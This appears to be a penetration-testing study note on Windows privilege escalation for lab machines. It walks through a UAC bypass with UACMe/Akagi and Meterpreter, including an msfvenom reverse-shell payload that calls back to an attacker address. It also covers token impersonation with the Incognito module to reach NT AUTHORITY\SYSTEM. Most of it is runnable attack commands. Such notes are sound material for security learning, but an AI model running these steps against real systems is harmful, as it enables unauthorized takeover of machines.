<h3>Windows Kernel Exploit</h3>
>Windows Kernel is the kernel that comes pre-packaged with all versions of microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy

Look for windows boxes that has the kernel exploit vuln(**Devel**)

one of the basic command to escalate priv esc on a windows is ```getsystem```, this would go through a plethora of techniques, but it can also fail actually


>Check out the  Devel Box Writeup, it's more of kernel exploit stuff.

<h4>Bypassing UAC with UACMe</h4>

UAC(User Account Control), has been present in all of windows from windows vista to windows 11. 

This is to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrator group

UACMe is an open source tool that can be used to bypass Windows UAC by leveraging various techniques

You can get it [here](https://github.com/hfiref0x/UACME)

To search for a running process
```
pgrep explorer
```
To migrate to that process, this provides a 64 bit meterpreter session
```
migrate 2223
```
To check if the user has elevated privileges
```
getprivs
```
To check users
```
net user
```
To check if the users are in the local administrators group
```
net localgroup administrators
```

>The version of Akagi you'll use depends on the version of windows you are running

To run akagi

Create a backdoor.exe using msfvenom
```
msfvenom -f exe -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -o backdoor.exe
```
Then set up the multi handler on metasploit
```
use exploit/multi/handler
set LHOST
set LPORT
run
```

Now, on the previous meterpreter shell you got, create a TEMP directory and upload the 2 files
```
upload backdoor.exe
upload Akagi64.exe
```
Making use of key "23", which essentially takes advantage of package manager on windows
```
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```
Running this bypasses UAC, then backdoor.exe should be executed with admin privileges
`
You should get a metterpreter shell, checking the privileges again
```
getprivs
```
You'll see the user has elevated privileges
Listing out processes
```
ps
```
With this you can migrate to a process with "NT Authority\System"
```
migrate PID
```
With this you would get a meterpreter shell as "NT Authority System"


>For windows 10, you can use key 33. Check out the documentation of the tool to read more about it

>In order to elevate privileges by bypassing uac, you will need access to a user that is a member of the local administrators group




<h4>Access Token Impersonation</h4>

>SeAssignPrimaryToken: This allows  a user to impersonate tokens

>SeCreateToken: This allows a user to create an arbitrary token with administrative privileges

>SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges

Using the "Incognito Module", this is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens successfully after exploitation. We can use this to display a list of token we can impersonate


To migrate to a 64bit meterpreter after getting your meterpreter session, you can migrate to explorer
```
pgrep explorer
migrate 2222
```
if "SeImpersonatePrivilege" is present, you can load incognito module on your meterpreter
```
load incognito
```
To list tokens, (you should see delegation tokens and impersonation tokens)
```
list_tokens -u
```
To impersonate token
```
impersonate_token "name of the token"
```
to check if it worked
```
getuid
```
So you can check the tokens again
```
list_tokens -u
```
If there's one for "NT Authority System", you can go ahead and impersonate it
```
impersonate_token "name of the token"
```

>If there's ever a scenario where the delegation or impersonation token isn't available, then you can go ahead with the potato attack
